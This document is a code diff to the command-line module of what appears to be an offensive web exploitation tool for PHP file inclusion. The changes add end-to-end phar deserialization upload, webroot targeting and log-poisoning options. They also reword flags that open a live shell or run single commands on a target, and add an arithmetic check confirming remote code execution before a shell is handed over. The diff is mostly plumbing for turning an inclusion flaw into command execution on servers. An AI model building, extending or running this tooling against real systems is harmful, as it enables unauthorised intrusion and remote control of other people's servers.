@@ -13,10 +13,9 @@ what the answer means.
 from __future__ import annotations
 
 import argparse
-import secrets
-
 from ...core import phar
 from ...core.httpmsg import parse_headers
+from ...engine.arithmetic import Arithmetic
 from ...engine.bypass import Bypass
 from ...engine.evidence import Judge
 from ...engine.runner import (
@@ -71,12 +70,18 @@ def add_arguments(parser: argparse.ArgumentParser) -> None:
         help="route every payload through a host the target trusts, with {target} standing for the "
         "real value, e.g. 'http://allowed/redirect?to={target}'",
     )
-    exploit = parser.add_argument_group("exploitation")
+    exploit = parser.add_argument_group(
+        "exploitation",
+        "Off by default. Without these the run only reports what it proved: that the "
+        "parameter accepts a wrapper, that a value came back, that a file was read.",
+    )
     exploit.add_argument(
         "--exploit",
         action="store_true",
-        help="act on what was proved: build a payload inside the stream with a generated filter chain "
-        "(php://filter) and run it, when the parameter reaches include(). No file, no upload",
+        help="prove the target will run code we supply, without running any: send a chain that "
+        "echoes a random marker and report whether it came back. This confirms the capability. "
+        "It does not execute a command - add --os-cmd or --os-shell for that, or --log-path "
+        "for the route that needs no php://filter",
     )
     exploit.add_argument(
         "--make-phar",
@@ -84,6 +89,26 @@ def add_arguments(parser: argparse.ArgumentParser) -> None:
         help="write a phar here and exit, with its metadata built from --phar-class and "
         "--phar-set. Upload it yourself, then point --upload at where it landed: the archive "
         "is the payload, and PHP unserializes the metadata when the target asks for it",
+    )
+    exploit.add_argument(
+        "--webroot",
+        metavar="DIR",
+        help="a directory the target serves from, when it is known. An archive gadget writes "
+        "files into one, and it is worked out from the target's own configuration where "
+        "possible - this overrides that when the operator knows better",
+    )
+    exploit.add_argument(
+        "--upload-to",
+        metavar="URL",
+        help="an upload endpoint to send the archive to, so the chain runs end to end: build, "
+        "upload, point the target at it, read the result back. Without it the archive has to "
+        "already be on the target and --upload names where",
+    )
+    exploit.add_argument(
+        "--upload-field",
+        metavar="NAME",
+        default="file",
+        help="the form field the upload endpoint expects the file in (default: file)",
     )
     exploit.add_argument(
         "--phar-class",
@@ -100,21 +125,23 @@ def add_arguments(parser: argparse.ArgumentParser) -> None:
     exploit.add_argument(
         "--log-path",
         metavar="PATH",
-        help="run commands by planting PHP in a log the target writes, then including it. "
-        "This is the route that still works when every wrapper is refused, because a plain "
-        "path goes to include() where `php://filter` does not. Point it at the server's "
-        "access log, e.g. /var/log/nginx/access.log",
+        help="run commands by planting PHP in a log the target writes, then including it. Needs "
+        "--exploit, and one of --os-cmd or --os-shell. This is the route that still works when "
+        "every wrapper is refused, because a plain path reaches include() where php://filter "
+        "does not. Point it at the server's access log, e.g. /var/log/nginx/access.log; the "
+        "application must be able to read it, and it must be small enough to include whole",
     )
     exploit.add_argument(
         "--os-shell",
         action="store_true",
-        help="open a live shell on the target through the filter chain: type commands, read their output, "
-        "'exit' to leave. Each command is a new chain, so a session costs one long request per command",
+        help="open a live shell on the target: type commands, read their output, 'exit' to leave. "
+        "Needs --exploit as well. The chain is built once and a short reader takes each command "
+        "from a second parameter, so a session costs one long request per command",
     )
     exploit.add_argument(
         "--os-cmd",
         metavar="COMMAND",
-        help="run one command through the filter chain and print its output, then exit",
+        help="run one command and print its output, then exit. Needs --exploit as well",
     )
 
 
@@ -128,15 +155,13 @@ def write_phar(args, runtime) -> int:
     if not args.phar_class:
         raise SystemExit("--make-phar needs --phar-class: the class the metadata is built as")
 
-    properties: dict[str, str] = {}
-    for pair in args.phar_set or []:
-        name, found, value = pair.partition("=")
-        if not found or not name:
-            raise SystemExit(f"--phar-set expects NAME=VALUE, got {pair!r}")
-        properties[name] = value
+    from .deserialize import Gadget, build_archive
 
-    metadata = phar.php_object(args.phar_class, properties)
-    blob = phar.build(files=[("index.php", b"<?php echo 1;")], metadata=metadata)
+    # The same builder the exploit chain uses, so a gadget that works offline
+    # works in a run and the other way round. Building it twice would be two
+    # things to keep in step.
+    gadget = Gadget(class_name=args.phar_class, properties=phar_config(args)["phar_set"])
+    blob = build_archive(gadget, {})
     try:
         with open(args.make_phar, "wb") as handle:
             handle.write(blob)
@@ -144,8 +169,8 @@ def write_phar(args, runtime) -> int:
         raise SystemExit(f"could not write {args.make_phar}: {error}")
 
     runtime.emit(f"[+] wrote {len(blob)} bytes to {args.make_phar}")
-    runtime.emit(f"    metadata: {metadata.decode('utf-8', 'replace')}")
-    runtime.emit("    upload it, then point --upload at the path it landed on")
+    runtime.emit(f"    metadata: {phar.php_object(args.phar_class, gadget.properties).decode('utf-8', 'replace')}")
+    runtime.emit("    upload it yourself, or pass --upload-to to have a run do it end to end")
     return 0
 
 
@@ -224,6 +249,7 @@ def run_shell(args: argparse.Namespace, runtime) -> int:
             "read": args.read or [],
             "upload": args.upload or "",
             "exploit": True,
+            **phar_config(args),
         },
         log=runtime.log,
         emit=runtime.emit,
@@ -253,15 +279,17 @@ def run_shell(args: argparse.Namespace, runtime) -> int:
         )
 
     try:
-        # Ask for something only a working chain could print. An application that
-        # echoes the payload back gives the extraction a seam to cut at even when
-        # nothing ran, so the tail can be the rest of the page - and then every
-        # command "returns" HTML. One marker tells the two apart before the
-        # operator is handed a shell that does not work.
-        marker = "ik" + secrets.token_hex(4)
-        if marker not in execute(f"echo {marker}"):
+        # Ask for something only a working chain could print, and ask for a
+        # number: the payload carries an addition and the response has to carry
+        # its result. A page echoing the payload back returns `2+3`, not `5`, so
+        # this cannot be satisfied by an application that never executed
+        # anything - which a marker the payload itself contains can be.
+        check = Arithmetic()
+        answer = check.proved(execute(check.command()))
+        if answer is None:
             runtime.warn(why)
             return 1
+        runtime.info(f"   the shell answered its arithmetic check ({answer})")
 
         if args.os_cmd:
             return run_once(execute, args.os_cmd)
@@ -274,6 +302,29 @@ def run_shell(args: argparse.Namespace, runtime) -> int:
         # A shell is the place an interrupt is most likely, and what was learned
         # about the filter on the way in is what the next attempt wants.
         close_filters(args, context.bypass, request)
+
+
+def phar_config(args) -> dict:
+    """The gadget and the upload endpoint, as the deserialization action wants them.
+
+    `--phar-set` arrives as a list of `NAME=VALUE` and is turned into the mapping
+    the gadget builder needs. Parsed here rather than inside the action so a
+    malformed pair is reported once, at startup, instead of in the middle of a
+    chain that has already spent requests.
+    """
+    properties: dict[str, str] = {}
+    for pair in getattr(args, "phar_set", None) or []:
+        name, found, value = pair.partition("=")
+        if not found or not name:
+            raise SystemExit(f"--phar-set expects NAME=VALUE, got {pair!r}")
+        properties[name] = value
+    return {
+        "phar_class": getattr(args, "phar_class", None) or "",
+        "phar_set": properties,
+        "upload_to": getattr(args, "upload_to", None) or "",
+        "upload_field": getattr(args, "upload_field", None) or "file",
+        "webroot": getattr(args, "webroot", None) or "",
+    }
 
 
 def run_one(request, params, args: argparse.Namespace, runtime) -> None:
@@ -308,6 +359,7 @@ def run_one(request, params, args: argparse.Namespace, runtime) -> None:
             "read": args.read or [],
             "upload": args.upload or "",
             "exploit": args.exploit,
+            **phar_config(args),
         },
         log=runtime.log,
         emit=runtime.emit,
@@ -322,6 +374,11 @@ def run_one(request, params, args: argparse.Namespace, runtime) -> None:
         # Ctrl+C is exactly what a resumed run needs.
         runtime.emit("")
         runtime.emit(board.render())
+        if getattr(args, "verbose", 0):
+            tried = board.render_bookkeeping()
+            if tried:
+                runtime.emit("")
+                runtime.emit(tried)
         points = board.render_findings()
         if points:
             runtime.emit("")
